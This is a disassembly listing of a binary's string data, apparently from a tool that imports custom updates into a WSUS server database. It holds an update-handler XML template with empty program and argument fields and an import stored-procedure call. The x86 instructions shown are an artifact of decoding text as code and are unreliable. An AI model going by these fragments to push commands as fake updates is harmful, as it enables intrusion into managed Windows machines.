  40790d:	00 65 00             	add    %ah,0x0(%ebp)
  407910:	49                   	dec    %ecx
  407911:	00 6e 00             	add    %ch,0x0(%esi)
  407914:	73 00                	jae    0x407916
  407916:	74 00                	je     0x407918
  407918:	61                   	popa
  407919:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40791d:	00 61 00             	add    %ah,0x0(%ecx)
  407920:	74 00                	je     0x407922
  407922:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407928:	22 00                	and    (%eax),%al
  40792a:	20 00                	and    %al,(%eax)
  40792c:	78 00                	js     0x40792e
  40792e:	6d                   	insl   (%dx),%es:(%edi)
  40792f:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  407933:	00 73 00             	add    %dh,0x0(%ebx)
  407936:	3a 00                	cmp    (%eax),%al
  407938:	78 00                	js     0x40793a
  40793a:	73 00                	jae    0x40793c
  40793c:	69 00 3d 00 22 00    	imul   $0x22003d,(%eax),%eax
  407942:	68 00 74 00 74       	push   $0x74007400
  407947:	00 70 00             	add    %dh,0x0(%eax)
  40794a:	3a 00                	cmp    (%eax),%al
  40794c:	2f                   	das
  40794d:	00 2f                	add    %ch,(%edi)
  40794f:	00 77 00             	add    %dh,0x0(%edi)
  407952:	77 00                	ja     0x407954
  407954:	77 00                	ja     0x407956
  407956:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  40795a:	33 00                	xor    (%eax),%eax
  40795c:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  407960:	72 00                	jb     0x407962
  407962:	67 00 2f             	add    %ch,(%bx)
  407965:	00 32                	add    %dh,(%edx)
  407967:	00 30                	add    %dh,(%eax)
  407969:	00 30                	add    %dh,(%eax)
  40796b:	00 31                	add    %dh,(%ecx)
  40796d:	00 2f                	add    %ch,(%edi)
  40796f:	00 58 00             	add    %bl,0x0(%eax)
  407972:	4d                   	dec    %ebp
  407973:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  407977:	00 63 00             	add    %ah,0x0(%ebx)
  40797a:	68 00 65 00 6d       	push   $0x6d006500
  40797f:	00 61 00             	add    %ah,0x0(%ecx)
  407982:	2d 00 69 00 6e       	sub    $0x6e006900,%eax
  407987:	00 73 00             	add    %dh,0x0(%ebx)
  40798a:	74 00                	je     0x40798c
  40798c:	61                   	popa
  40798d:	00 6e 00             	add    %ch,0x0(%esi)
  407990:	63 00                	arpl   %eax,(%eax)
  407992:	65 00 22             	add    %ah,%gs:(%edx)
  407995:	00 20                	add    %ah,(%eax)
  407997:	00 78 00             	add    %bh,0x0(%eax)
  40799a:	6d                   	insl   (%dx),%es:(%edi)
  40799b:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40799f:	00 73 00             	add    %dh,0x0(%ebx)
  4079a2:	3a 00                	cmp    (%eax),%al
  4079a4:	70 00                	jo     0x4079a6
  4079a6:	75 00                	jne    0x4079a8
  4079a8:	62 00                	bound  %eax,(%eax)
  4079aa:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  4079af:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4079b3:	00 70 00             	add    %dh,0x0(%eax)
  4079b6:	3a 00                	cmp    (%eax),%al
  4079b8:	2f                   	das
  4079b9:	00 2f                	add    %ch,(%edi)
  4079bb:	00 73 00             	add    %dh,0x0(%ebx)
  4079be:	63 00                	arpl   %eax,(%eax)
  4079c0:	68 00 65 00 6d       	push   $0x6d006500
  4079c5:	00 61 00             	add    %ah,0x0(%ecx)
  4079c8:	73 00                	jae    0x4079ca
  4079ca:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4079ce:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4079d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d5:	00 73 00             	add    %dh,0x0(%ebx)
  4079d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d9:	00 66 00             	add    %ah,0x0(%esi)
  4079dc:	74 00                	je     0x4079de
  4079de:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4079e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e3:	00 6d 00             	add    %ch,0x0(%ebp)
  4079e6:	2f                   	das
  4079e7:	00 6d 00             	add    %ch,0x0(%ebp)
  4079ea:	73 00                	jae    0x4079ec
  4079ec:	75 00                	jne    0x4079ee
  4079ee:	73 00                	jae    0x4079f0
  4079f0:	2f                   	das
  4079f1:	00 32                	add    %dh,(%edx)
  4079f3:	00 30                	add    %dh,(%eax)
  4079f5:	00 30                	add    %dh,(%eax)
  4079f7:	00 32                	add    %dh,(%edx)
  4079f9:	00 2f                	add    %ch,(%edi)
  4079fb:	00 31                	add    %dh,(%ecx)
  4079fd:	00 32                	add    %dh,(%edx)
  4079ff:	00 2f                	add    %ch,(%edi)
  407a01:	00 50 00             	add    %dl,0x0(%eax)
  407a04:	75 00                	jne    0x407a06
  407a06:	62 00                	bound  %eax,(%eax)
  407a08:	6c                   	insb   (%dx),%es:(%edi)
  407a09:	00 69 00             	add    %ch,0x0(%ecx)
  407a0c:	73 00                	jae    0x407a0e
  407a0e:	68 00 69 00 6e       	push   $0x6e006900
  407a13:	00 67 00             	add    %ah,0x0(%edi)
  407a16:	22 00                	and    (%eax),%al
  407a18:	3e 00 01             	add    %al,%ds:(%ecx)
  407a1b:	43                   	inc    %ebx
  407a1c:	09 00                	or     %eax,(%eax)
  407a1e:	09 00                	or     %eax,(%eax)
  407a20:	3c 00                	cmp    $0x0,%al
  407a22:	63 00                	arpl   %eax,(%eax)
  407a24:	6d                   	insl   (%dx),%es:(%edi)
  407a25:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  407a29:	00 49 00             	add    %cl,0x0(%ecx)
  407a2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407a2d:	00 73 00             	add    %dh,0x0(%ebx)
  407a30:	74 00                	je     0x407a32
  407a32:	61                   	popa
  407a33:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407a37:	00 43 00             	add    %al,0x0(%ebx)
  407a3a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a3b:	00 6d 00             	add    %ch,0x0(%ebp)
  407a3e:	6d                   	insl   (%dx),%es:(%edi)
  407a3f:	00 61 00             	add    %ah,0x0(%ecx)
  407a42:	6e                   	outsb  %ds:(%esi),(%dx)
  407a43:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  407a47:	00 41 00             	add    %al,0x0(%ecx)
  407a4a:	72 00                	jb     0x407a4c
  407a4c:	67 00 75 00          	add    %dh,0x0(%di)
  407a50:	6d                   	insl   (%dx),%es:(%edi)
  407a51:	00 65 00             	add    %ah,0x0(%ebp)
  407a54:	6e                   	outsb  %ds:(%esi),(%dx)
  407a55:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  407a59:	00 3d 00 22 00 00    	add    %bh,0x2200
  407a5f:	17                   	pop    %ss
  407a60:	22 00                	and    (%eax),%al
  407a62:	20 00                	and    %al,(%eax)
  407a64:	50                   	push   %eax
  407a65:	00 72 00             	add    %dh,0x0(%edx)
  407a68:	6f                   	outsl  %ds:(%esi),(%dx)
  407a69:	00 67 00             	add    %ah,0x0(%edi)
  407a6c:	72 00                	jb     0x407a6e
  407a6e:	61                   	popa
  407a6f:	00 6d 00             	add    %ch,0x0(%ebp)
  407a72:	3d 00 22 00 00       	cmp    $0x2200,%eax
  407a77:	81 23 22 00 20 00    	andl   $0x200022,(%ebx)
  407a7d:	52                   	push   %edx
  407a7e:	00 65 00             	add    %ah,0x0(%ebp)
  407a81:	62 00                	bound  %eax,(%eax)
  407a83:	6f                   	outsl  %ds:(%esi),(%dx)
  407a84:	00 6f 00             	add    %ch,0x0(%edi)
  407a87:	74 00                	je     0x407a89
  407a89:	42                   	inc    %edx
  407a8a:	00 79 00             	add    %bh,0x0(%ecx)
  407a8d:	44                   	inc    %esp
  407a8e:	00 65 00             	add    %ah,0x0(%ebp)
  407a91:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407a95:	75 00                	jne    0x407a97
  407a97:	6c                   	insb   (%dx),%es:(%edi)
  407a98:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  407a9c:	00 22                	add    %ah,(%edx)
  407a9e:	00 66 00             	add    %ah,0x0(%esi)
  407aa1:	61                   	popa
  407aa2:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  407aa6:	00 65 00             	add    %ah,0x0(%ebp)
  407aa9:	22 00                	and    (%eax),%al
  407aab:	20 00                	and    %al,(%eax)
  407aad:	44                   	inc    %esp
  407aae:	00 65 00             	add    %ah,0x0(%ebp)
  407ab1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407ab5:	75 00                	jne    0x407ab7
  407ab7:	6c                   	insb   (%dx),%es:(%edi)
  407ab8:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  407abc:	00 65 00             	add    %ah,0x0(%ebp)
  407abf:	73 00                	jae    0x407ac1
  407ac1:	75 00                	jne    0x407ac3
  407ac3:	6c                   	insb   (%dx),%es:(%edi)
  407ac4:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  407ac8:	00 22                	add    %ah,(%edx)
  407aca:	00 53 00             	add    %dl,0x0(%ebx)
  407acd:	75 00                	jne    0x407acf
  407acf:	63 00                	arpl   %eax,(%eax)
  407ad1:	63 00                	arpl   %eax,(%eax)
  407ad3:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  407ad7:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407adb:	64 00 22             	add    %ah,%fs:(%edx)
  407ade:	00 20                	add    %ah,(%eax)
  407ae0:	00 78 00             	add    %bh,0x0(%eax)
  407ae3:	6d                   	insl   (%dx),%es:(%edi)
  407ae4:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  407ae8:	00 73 00             	add    %dh,0x0(%ebx)
  407aeb:	3a 00                	cmp    (%eax),%al
  407aed:	63 00                	arpl   %eax,(%eax)
  407aef:	6d                   	insl   (%dx),%es:(%edi)
  407af0:	00 64 00 3d          	add    %ah,0x3d(%eax,%eax,1)
  407af4:	00 22                	add    %ah,(%edx)
  407af6:	00 68 00             	add    %ch,0x0(%eax)
  407af9:	74 00                	je     0x407afb
  407afb:	74 00                	je     0x407afd
  407afd:	70 00                	jo     0x407aff
  407aff:	3a 00                	cmp    (%eax),%al
  407b01:	2f                   	das
  407b02:	00 2f                	add    %ch,(%edi)
  407b04:	00 73 00             	add    %dh,0x0(%ebx)
  407b07:	63 00                	arpl   %eax,(%eax)
  407b09:	68 00 65 00 6d       	push   $0x6d006500
  407b0e:	00 61 00             	add    %ah,0x0(%ecx)
  407b11:	73 00                	jae    0x407b13
  407b13:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  407b17:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b1e:	00 73 00             	add    %dh,0x0(%ebx)
  407b21:	6f                   	outsl  %ds:(%esi),(%dx)
  407b22:	00 66 00             	add    %ah,0x0(%esi)
  407b25:	74 00                	je     0x407b27
  407b27:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407b2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b2c:	00 6d 00             	add    %ch,0x0(%ebp)
  407b2f:	2f                   	das
  407b30:	00 6d 00             	add    %ch,0x0(%ebp)
  407b33:	73 00                	jae    0x407b35
  407b35:	75 00                	jne    0x407b37
  407b37:	73 00                	jae    0x407b39
  407b39:	2f                   	das
  407b3a:	00 32                	add    %dh,(%edx)
  407b3c:	00 30                	add    %dh,(%eax)
  407b3e:	00 30                	add    %dh,(%eax)
  407b40:	00 32                	add    %dh,(%edx)
  407b42:	00 2f                	add    %ch,(%edi)
  407b44:	00 31                	add    %dh,(%ecx)
  407b46:	00 32                	add    %dh,(%edx)
  407b48:	00 2f                	add    %ch,(%edi)
  407b4a:	00 55 00             	add    %dl,0x0(%ebp)
  407b4d:	70 00                	jo     0x407b4f
  407b4f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407b53:	74 00                	je     0x407b55
  407b55:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  407b59:	61                   	popa
  407b5a:	00 6e 00             	add    %ch,0x0(%esi)
  407b5d:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  407b62:	00 72 00             	add    %dh,0x0(%edx)
  407b65:	73 00                	jae    0x407b67
  407b67:	2f                   	das
  407b68:	00 43 00             	add    %al,0x0(%ebx)
  407b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6c:	00 6d 00             	add    %ch,0x0(%ebp)
  407b6f:	6d                   	insl   (%dx),%es:(%edi)
  407b70:	00 61 00             	add    %ah,0x0(%ecx)
  407b73:	6e                   	outsb  %ds:(%esi),(%dx)
  407b74:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  407b78:	00 69 00             	add    %ch,0x0(%ecx)
  407b7b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7c:	00 65 00             	add    %ah,0x0(%ebp)
  407b7f:	49                   	dec    %ecx
  407b80:	00 6e 00             	add    %ch,0x0(%esi)
  407b83:	73 00                	jae    0x407b85
  407b85:	74 00                	je     0x407b87
  407b87:	61                   	popa
  407b88:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407b8c:	00 61 00             	add    %ah,0x0(%ecx)
  407b8f:	74 00                	je     0x407b91
  407b91:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407b97:	22 00                	and    (%eax),%al
  407b99:	3e 00 00             	add    %al,%ds:(%eax)
  407b9c:	80 81 09 00 09 00 09 	addb   $0x9,0x90009(%ecx)
  407ba3:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407ba6:	63 00                	arpl   %eax,(%eax)
  407ba8:	6d                   	insl   (%dx),%es:(%edi)
  407ba9:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  407bad:	00 52 00             	add    %dl,0x0(%edx)
  407bb0:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  407bb5:	00 72 00             	add    %dh,0x0(%edx)
  407bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb9:	00 43 00             	add    %al,0x0(%ebx)
  407bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbd:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407bc1:	00 20                	add    %ah,(%eax)
  407bc3:	00 52 00             	add    %dl,0x0(%edx)
  407bc6:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  407bca:	6f                   	outsl  %ds:(%esi),(%dx)
  407bcb:	00 6f 00             	add    %ch,0x0(%edi)
  407bce:	74 00                	je     0x407bd0
  407bd0:	3d 00 22 00 66       	cmp    $0x66002200,%eax
  407bd5:	00 61 00             	add    %ah,0x0(%ecx)
  407bd8:	6c                   	insb   (%dx),%es:(%edi)
  407bd9:	00 73 00             	add    %dh,0x0(%ebx)
  407bdc:	65 00 22             	add    %ah,%gs:(%edx)
  407bdf:	00 20                	add    %ah,(%eax)
  407be1:	00 52 00             	add    %dl,0x0(%edx)
  407be4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407be8:	75 00                	jne    0x407bea
  407bea:	6c                   	insb   (%dx),%es:(%edi)
  407beb:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  407bef:	00 22                	add    %ah,(%edx)
  407bf1:	00 53 00             	add    %dl,0x0(%ebx)
  407bf4:	75 00                	jne    0x407bf6
  407bf6:	63 00                	arpl   %eax,(%eax)
  407bf8:	63 00                	arpl   %eax,(%eax)
  407bfa:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  407bfe:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407c02:	64 00 22             	add    %ah,%fs:(%edx)
  407c05:	00 20                	add    %ah,(%eax)
  407c07:	00 43 00             	add    %al,0x0(%ebx)
  407c0a:	6f                   	outsl  %ds:(%esi),(%dx)
  407c0b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407c0f:	00 3d 00 22 00 30    	add    %bh,0x30002200
  407c15:	00 22                	add    %ah,(%edx)
  407c17:	00 20                	add    %ah,(%eax)
  407c19:	00 2f                	add    %ch,(%edi)
  407c1b:	00 3e                	add    %bh,(%esi)
  407c1d:	00 00                	add    %al,(%eax)
  407c1f:	2f                   	das
  407c20:	09 00                	or     %eax,(%eax)
  407c22:	09 00                	or     %eax,(%eax)
  407c24:	3c 00                	cmp    $0x0,%al
  407c26:	2f                   	das
  407c27:	00 63 00             	add    %ah,0x0(%ebx)
  407c2a:	6d                   	insl   (%dx),%es:(%edi)
  407c2b:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  407c2f:	00 49 00             	add    %cl,0x0(%ecx)
  407c32:	6e                   	outsb  %ds:(%esi),(%dx)
  407c33:	00 73 00             	add    %dh,0x0(%ebx)
  407c36:	74 00                	je     0x407c38
  407c38:	61                   	popa
  407c39:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407c3d:	00 43 00             	add    %al,0x0(%ebx)
  407c40:	6f                   	outsl  %ds:(%esi),(%dx)
  407c41:	00 6d 00             	add    %ch,0x0(%ebp)
  407c44:	6d                   	insl   (%dx),%es:(%edi)
  407c45:	00 61 00             	add    %ah,0x0(%ecx)
  407c48:	6e                   	outsb  %ds:(%esi),(%dx)
  407c49:	00 64 00 3e          	add    %ah,0x3e(%eax,%eax,1)
  407c4d:	00 00                	add    %al,(%eax)
  407c4f:	37                   	aaa
  407c50:	09 00                	or     %eax,(%eax)
  407c52:	3c 00                	cmp    $0x0,%al
  407c54:	2f                   	das
  407c55:	00 75 00             	add    %dh,0x0(%ebp)
  407c58:	70 00                	jo     0x407c5a
  407c5a:	64 00 3a             	add    %bh,%fs:(%edx)
  407c5d:	00 48 00             	add    %cl,0x0(%eax)
  407c60:	61                   	popa
  407c61:	00 6e 00             	add    %ch,0x0(%esi)
  407c64:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  407c69:	00 72 00             	add    %dh,0x0(%edx)
  407c6c:	53                   	push   %ebx
  407c6d:	00 70 00             	add    %dh,0x0(%eax)
  407c70:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407c74:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  407c7a:	63 00                	arpl   %eax,(%eax)
  407c7c:	44                   	inc    %esp
  407c7d:	00 61 00             	add    %ah,0x0(%ecx)
  407c80:	74 00                	je     0x407c82
  407c82:	61                   	popa
  407c83:	00 3e                	add    %bh,(%esi)
  407c85:	00 00                	add    %al,(%eax)
  407c87:	1f                   	pop    %ds
  407c88:	3c 00                	cmp    $0x0,%al
  407c8a:	2f                   	das
  407c8b:	00 75 00             	add    %dh,0x0(%ebp)
  407c8e:	70 00                	jo     0x407c90
  407c90:	64 00 3a             	add    %bh,%fs:(%edx)
  407c93:	00 55 00             	add    %dl,0x0(%ebp)
  407c96:	70 00                	jo     0x407c98
  407c98:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407c9c:	74 00                	je     0x407c9e
  407c9e:	65 00 3e             	add    %bh,%gs:(%esi)
  407ca1:	00 27                	add    %ah,(%edi)
  407ca3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407ca6:	01 80 f1 40 00 55    	add    %eax,0x550040f1(%eax)
  407cac:	00 70 00             	add    %dh,0x0(%eax)
  407caf:	73 00                	jae    0x407cb1
  407cb1:	74 00                	je     0x407cb3
  407cb3:	72 00                	jb     0x407cb5
  407cb5:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407cb9:	6d                   	insl   (%dx),%es:(%edi)
  407cba:	00 53 00             	add    %dl,0x0(%ebx)
  407cbd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407cc1:	76 00                	jbe    0x407cc3
  407cc3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407cc7:	4c                   	dec    %esp
  407cc8:	00 6f 00             	add    %ch,0x0(%edi)
  407ccb:	63 00                	arpl   %eax,(%eax)
  407ccd:	61                   	popa
  407cce:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  407cd2:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  407cd6:	00 31                	add    %dh,(%ecx)
  407cd8:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407cdb:	40                   	inc    %eax
  407cdc:	00 49 00             	add    %cl,0x0(%ecx)
  407cdf:	6d                   	insl   (%dx),%es:(%edi)
  407ce0:	00 70 00             	add    %dh,0x0(%eax)
  407ce3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ce4:	00 72 00             	add    %dh,0x0(%edx)
  407ce7:	74 00                	je     0x407ce9
  407ce9:	65 00 64 00 3d       	add    %ah,%gs:0x3d(%eax,%eax,1)
  407cee:	00 40 00             	add    %al,0x0(%eax)
  407cf1:	69 00 49 00 6d 00    	imul   $0x6d0049,(%eax),%eax
  407cf7:	70 00                	jo     0x407cf9
  407cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  407cfa:	00 72 00             	add    %dh,0x0(%edx)
  407cfd:	74 00                	je     0x407cff
  407cff:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  407d04:	00 6f 00             	add    %ch,0x0(%edi)
  407d07:	75 00                	jne    0x407d09
  407d09:	74 00                	je     0x407d0b
  407d0b:	70 00                	jo     0x407d0d
  407d0d:	75 00                	jne    0x407d0f
  407d0f:	74 00                	je     0x407d11
  407d11:	2c 00                	sub    $0x0,%al
  407d13:	40                   	inc    %eax
  407d14:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407d18:	00 63 00             	add    %ah,0x0(%ebx)
  407d1b:	61                   	popa
  407d1c:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  407d20:	00 65 00             	add    %ah,0x0(%ebp)
  407d23:	76 00                	jbe    0x407d25
  407d25:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2c:	00 6e 00             	add    %ch,0x0(%esi)
  407d2f:	49                   	dec    %ecx
  407d30:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  407d34:	00 40 00             	add    %al,0x0(%eax)
  407d37:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  407d3d:	63 00                	arpl   %eax,(%eax)
  407d3f:	61                   	popa
  407d40:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  407d44:	00 65 00             	add    %ah,0x0(%ebp)
  407d47:	76 00                	jbe    0x407d49
  407d49:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d50:	00 6e 00             	add    %ch,0x0(%esi)
  407d53:	49                   	dec    %ecx
  407d54:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  407d58:	00 6f 00             	add    %ch,0x0(%edi)
  407d5b:	75 00                	jne    0x407d5d
  407d5d:	74 00                	je     0x407d5f
  407d5f:	70 00                	jo     0x407d61
  407d61:	75 00                	jne    0x407d63
  407d63:	74 00                	je     0x407d65
  407d65:	2c 00                	sub    $0x0,%al
  407d67:	40                   	inc    %eax
  407d68:	00 55 00             	add    %dl,0x0(%ebp)
  407d6b:	70 00                	jo     0x407d6d
  407d6d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407d71:	74 00                	je     0x407d73
  407d73:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  407d77:	6d                   	insl   (%dx),%es:(%edi)
  407d78:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  407d7c:	00 6f 00             	add    %ch,0x0(%edi)
  407d7f:	6d                   	insl   (%dx),%es:(%edi)
  407d80:	00 70 00             	add    %dh,0x0(%eax)
  407d83:	72 00                	jb     0x407d85
  407d85:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407d89:	73 00                	jae    0x407d8b
  407d8b:	65 00 64 00 3d       	add    %ah,%gs:0x3d(%eax,%eax,1)
  407d90:	00 4e 00             	add    %cl,0x0(%esi)
  407d93:	55                   	push   %ebp
  407d94:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  407d98:	00 00                	add    %al,(%eax)
  407d9a:	47                   	inc    %edi
  407d9b:	73 00                	jae    0x407d9d
  407d9d:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  407da2:	00 63 00             	add    %ah,0x0(%ebx)
  407da5:	74 00                	je     0x407da7
  407da7:	20 00                	and    %al,(%eax)
  407da9:	40                   	inc    %eax
  407daa:	00 69 00             	add    %ch,0x0(%ecx)
  407dad:	49                   	dec    %ecx
  407dae:	00 6d 00             	add    %ch,0x0(%ebp)
  407db1:	70 00                	jo     0x407db3
  407db3:	6f                   	outsl  %ds:(%esi),(%dx)
  407db4:	00 72 00             	add    %dh,0x0(%edx)
  407db7:	74 00                	je     0x407db9
  407db9:	65 00 64 00 2c       	add    %ah,%gs:0x2c(%eax,%eax,1)
  407dbe:	00 40 00             	add    %al,0x0(%eax)
  407dc1:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  407dc7:	63 00                	arpl   %eax,(%eax)
  407dc9:	61                   	popa
  407dca:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  407dce:	00 65 00             	add    %ah,0x0(%ebp)
  407dd1:	76 00                	jbe    0x407dd3
  407dd3:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407dd9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dda:	00 6e 00             	add    %ch,0x0(%esi)
  407ddd:	49                   	dec    %ecx
  407dde:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  407de2:	2d 45 00 72 00       	sub    $0x720045,%eax
  407de7:	72 00                	jb     0x407de9
  407de9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dea:	00 72 00             	add    %dh,0x0(%edx)
  407ded:	20 00                	and    %al,(%eax)
  407def:	69 00 6d 00 70 00    	imul   $0x70006d,(%eax),%eax
  407df5:	6f                   	outsl  %ds:(%esi),(%dx)
  407df6:	00 72 00             	add    %dh,0x0(%edx)
  407df9:	74 00                	je     0x407dfb
  407dfb:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  407e01:	20 00                	and    %al,(%eax)
  407e03:	75 00                	jne    0x407e05
  407e05:	70 00                	jo     0x407e07
  407e07:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407e0b:	74 00                	je     0x407e0d
  407e0d:	65 00 00             	add    %al,%gs:(%eax)
  407e10:	19 49 00             	sbb    %ecx,0x0(%ecx)
  407e13:	6d                   	insl   (%dx),%es:(%edi)
  407e14:	00 70 00             	add    %dh,0x0(%eax)
  407e17:	6f                   	outsl  %ds:(%esi),(%dx)
  407e18:	00 72 00             	add    %dh,0x0(%edx)
  407e1b:	74 00                	je     0x407e1d
  407e1d:	55                   	push   %ebp
  407e1e:	00 70 00             	add    %dh,0x0(%eax)
  407e21:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407e25:	74 00                	je     0x407e27
  407e27:	65 00 00             	add    %al,%gs:(%eax)
  407e2a:	2f                   	das
  407e2b:	55                   	push   %ebp
  407e2c:	00 70 00             	add    %dh,0x0(%eax)
  407e2f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407e33:	74 00                	je     0x407e35
  407e35:	65 00 20             	add    %ah,%gs:(%eax)
  407e38:	00 52 00             	add    %dl,0x0(%edx)
  407e3b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407e3f:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407e45:	6f                   	outsl  %ds:(%esi),(%dx)
  407e46:	00 6e 00             	add    %ch,0x0(%esi)
  407e49:	20 00                	and    %al,(%eax)
  407e4b:	49                   	dec    %ecx
  407e4c:	00 44 00 3a          	add    %al,0x3a(%eax,%eax,1)
  407e50:	00 20                	add    %ah,(%eax)
  407e52:	00 7b 00             	add    %bh,0x0(%ebx)
  407e55:	30 00                	xor    %al,(%eax)
  407e57:	7d 00                	jge    0x407e59
  407e59:	00 45 0d             	add    %al,0xd(%ebp)
  407e5c:	00 0a                	add    %cl,(%edx)
  407e5e:	00 46 00             	add    %al,0x0(%esi)
  407e61:	75 00                	jne    0x407e63
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	00 63 00             	add    %ah,0x0(%ebx)
  407e67:	74 00                	je     0x407e69
  407e69:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407e6f:	20 00                	and    %al,(%eax)
  407e71:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407e75:	72 00                	jb     0x407e77
  407e77:	6f                   	outsl  %ds:(%esi),(%dx)
  407e78:	00 72 00             	add    %dh,0x0(%edx)
  407e7b:	20 00                	and    %al,(%eax)
  407e7d:	2d 00 20 00 46       	sub    $0x46002000,%eax
  407e82:	00 62 00             	add    %ah,0x0(%edx)
  407e85:	49                   	dec    %ecx
  407e86:	00 6d 00             	add    %ch,0x0(%ebp)
  407e89:	70 00                	jo     0x407e8b
  407e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e8c:	00 72 00             	add    %dh,0x0(%edx)
  407e8f:	74 00                	je     0x407e91
  407e91:	55                   	push   %ebp
  407e92:	00 70 00             	add    %dh,0x0(%eax)
  407e95:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407e99:	74 00                	je     0x407e9b
  407e9b:	65 00 2e             	add    %ch,%gs:(%esi)
